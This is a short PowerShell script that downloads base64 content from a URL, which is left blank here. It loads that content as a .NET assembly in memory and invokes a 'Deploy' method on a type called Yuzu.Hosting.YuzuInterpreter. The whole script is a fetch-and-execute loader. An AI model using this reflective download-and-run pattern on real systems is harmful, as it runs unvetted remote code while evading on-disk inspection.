Clear-Host
[Reflection.Assembly]::Load([Convert]::FromBase64String((iwr "").Content)).GetType("Yuzu.Hosting.YuzuInterpreter").GetMethod("Deploy").Invoke($null, @($null))